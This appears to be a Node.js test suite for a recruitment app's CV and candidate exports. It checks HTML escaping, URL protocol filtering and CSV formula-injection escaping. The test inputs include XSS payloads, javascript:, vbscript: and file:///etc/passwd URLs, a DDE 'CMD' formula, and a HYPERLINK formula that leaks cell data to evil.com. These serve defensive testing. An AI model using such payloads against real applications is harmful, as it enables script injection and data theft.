import { describe, it } from 'node:test';
import assert from 'node:assert';
import {
  isSafeUrl,
  sanitizeUrl,
  escapeCsvField,
  exportCandidatesToCsv
} from '../../utils/dataNormalizer.js';
import {
  escapeHtml,
  generateStandaloneHtml,
  generateCvMarkdown
} from '../../services/cvExportService.js';

describe('Security & Sanitization Test Suite: XSS, CSV Injection & Protocol Hardening', () => {

  describe('1. HTML Entity Escaping (Anti-XSS)', () => {
    it('should escape dangerous HTML characters (&, <, >, ", \')', () => {
      const malicious = '<script>alert("XSS & attack")</script>\'test\'';
      const escaped = escapeHtml(malicious);
      assert.strictEqual(escaped, '&lt;script&gt;alert(&quot;XSS &amp; attack&quot;)&lt;/script&gt;&#39;test&#39;');
      assert.strictEqual(escaped.includes('<script>'), false);
    });

    it('should handle null, undefined and non-string inputs gracefully', () => {
      assert.strictEqual(escapeHtml(null), '');
      assert.strictEqual(escapeHtml(undefined), '');
      assert.strictEqual(escapeHtml(12345), '12345');
    });

    it('should neutralize stored XSS in generateStandaloneHtml export', () => {
      const cvDataWithXss = {
        personal: {
          fullName: 'Nguyễn <script>alert("Hacked")</script>',
          title: 'Developer <img src=x onerror=alert(1)>',
          phone: '0901234567"><script>evil()</script>',
          email: 'test@fasthunt.vn',
          location: 'Hà Nội',
          expectedSalary: '20M',
          availability: 'Ngay',
          avatarUrl: 'javascript:alert(1)' // Dangerous avatar
        },
        summary: 'Kinh nghiệm với <svg onload=alert(2)>',
        experiences: [
          {
            role: 'Lead Dev <script>',
            company: 'Tech Corp <script>',
            period: '2023 - 2026',
            description: 'Phát triển web <img src=x onerror=bad()>'
          }
        ],
        skills: ['React', '<script>alert(3)</script>'],
        education: [
          { school: 'ĐH Bách Khoa <script>', degree: 'Kỹ sư', year: '2022' }
        ],
        languages: [
          { name: 'Tiếng Anh <script>', level: 'C1' }
        ],
        endorsement: 'Đánh giá tốt <script>stealCookies()</script>'
      };

      const html = generateStandaloneHtml(cvDataWithXss, 'modern', '#2563eb');

      // Assert that NO raw dangerous HTML tags exist anywhere in output HTML
      assert.strictEqual(html.includes('<script>'), false);
      assert.strictEqual(html.includes('<img src='), false);
      assert.strictEqual(html.includes('<svg onload='), false);
      assert.strictEqual(html.includes('stealCookies()</script>'), false);

      // Assert that dangerous javascript: avatar was stripped out
      assert.strictEqual(html.includes('src="javascript:'), false);

      // Assert escaped characters are present
      assert.strictEqual(html.includes('&lt;script&gt;alert'), true);
      assert.strictEqual(html.includes('&lt;img src=x onerror=alert(1)&gt;'), true);
    });
  });

  describe('2. URL & Protocol Validation (Anti-javascript: URI DOM XSS)', () => {
    it('should reject javascript: URLs with arbitrary casing or spaces', () => {
      assert.strictEqual(isSafeUrl('javascript:alert(1)'), false);
      assert.strictEqual(isSafeUrl('JAVASCRIPT:alert(1)'), false);
      assert.strictEqual(isSafeUrl(' java script:alert(1)'), false);
      assert.strictEqual(isSafeUrl('javascript:void(0)'), false);
    });

    it('should reject vbscript: and file: URLs', () => {
      assert.strictEqual(isSafeUrl('vbscript:msgbox(1)'), false);
      assert.strictEqual(isSafeUrl('file:///etc/passwd'), false);
      assert.strictEqual(isSafeUrl('FILE://C:/Windows'), false);
    });

    it('should reject data:text/html and accept only data:image/', () => {
      assert.strictEqual(isSafeUrl('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='), false);
      assert.strictEqual(isSafeUrl('data:application/javascript;base64,YWxlcnQoMSk='), false);
      assert.strictEqual(isSafeUrl('data:image/png;base64,iVBORw0KGgoAAAANSUhEUg=='), true);
      assert.strictEqual(isSafeUrl('data:image/jpeg;base64,/9j/4AAQSkZJRg=='), true);
    });

    it('should allow valid http, https, mailto, tel URLs', () => {
      assert.strictEqual(isSafeUrl('https://docs.google.com/spreadsheets/d/123'), true);
      assert.strictEqual(isSafeUrl('http://fasthunt.vn'), true);
      assert.strictEqual(isSafeUrl('https://zalo.me/0901234567'), true);
      assert.strictEqual(isSafeUrl('tel:0901234567'), true);
      assert.strictEqual(isSafeUrl('mailto:recruitment@fasthunt.vn'), true);
    });

    it('sanitizeUrl should return empty or custom fallback for dangerous URLs', () => {
      assert.strictEqual(sanitizeUrl('javascript:alert(1)'), '');
      assert.strictEqual(sanitizeUrl('javascript:alert(1)', '#'), '#');
      assert.strictEqual(sanitizeUrl('https://google.com'), 'https://google.com');
    });
  });

  describe('3. CSV Formula Injection Prevention (CWE-1236)', () => {
    it('should prepend single quote to fields starting with =', () => {
      const malicious = '=CMD|\' /C calc\'!A0';
      const escaped = escapeCsvField(malicious);
      assert.strictEqual(escaped, '"\'=CMD|\' /C calc\'!A0"');
    });

    it('should prepend single quote to fields starting with +, -, @, \\t, \\r', () => {
      assert.strictEqual(escapeCsvField('+123456'), '"\'+123456"');
      assert.strictEqual(escapeCsvField('-123456'), '"\'-123456"');
      assert.strictEqual(escapeCsvField('@SUM(A1:A10)'), '"\'@SUM(A1:A10)"');
      assert.strictEqual(escapeCsvField('\tTAB_INJECTION'), '"\'\tTAB_INJECTION"');
    });

    it('should not alter normal text without formula triggers', () => {
      assert.strictEqual(escapeCsvField('Nguyễn Văn A'), '"Nguyễn Văn A"');
      assert.strictEqual(escapeCsvField('Chuyên viên tuyển dụng'), '"Chuyên viên tuyển dụng"');
    });

    it('should safely export candidates containing formula injection attempts without executing formulas', () => {
      const candidates = [
        {
          id: 'cand_test',
          name: '=HYPERLINK("http://evil.com?leak="&A1, "Click Here")',
          ctvCode: '+CTV99',
          positionCompany: '-IT Lead',
          desiredSalary: '@15000000',
          cvUrl: 'javascript:alert(1)' // Should also be sanitized
        }
      ];

      const csv = exportCandidatesToCsv(candidates, 'test.csv');
      // Verify formula characters were escaped with leading single quote
      assert.strictEqual(csv.includes('"\'=HYPERLINK'), true);
      assert.strictEqual(csv.includes('"\'+CTV99"'), true);
      assert.strictEqual(csv.includes('"\'-IT Lead"'), true);
      assert.strictEqual(csv.includes('"\'@15000000"'), true);
      // Verify dangerous javascript: cvUrl was sanitized to empty string in CSV
      assert.strictEqual(csv.includes('javascript:alert'), false);
    });
  });

  describe('4. Markdown Export Sanitization', () => {
    it('should neutralize javascript: in portfolio/website link in generateCvMarkdown', () => {
      const cvData = {
        personal: {
          fullName: 'Trần Văn B',
          title: 'Designer',
          website: 'javascript:alert(1)'
        }
      };
      const md = generateCvMarkdown(cvData);
      assert.strictEqual(md.includes('javascript:alert'), false);
    });
  });
});
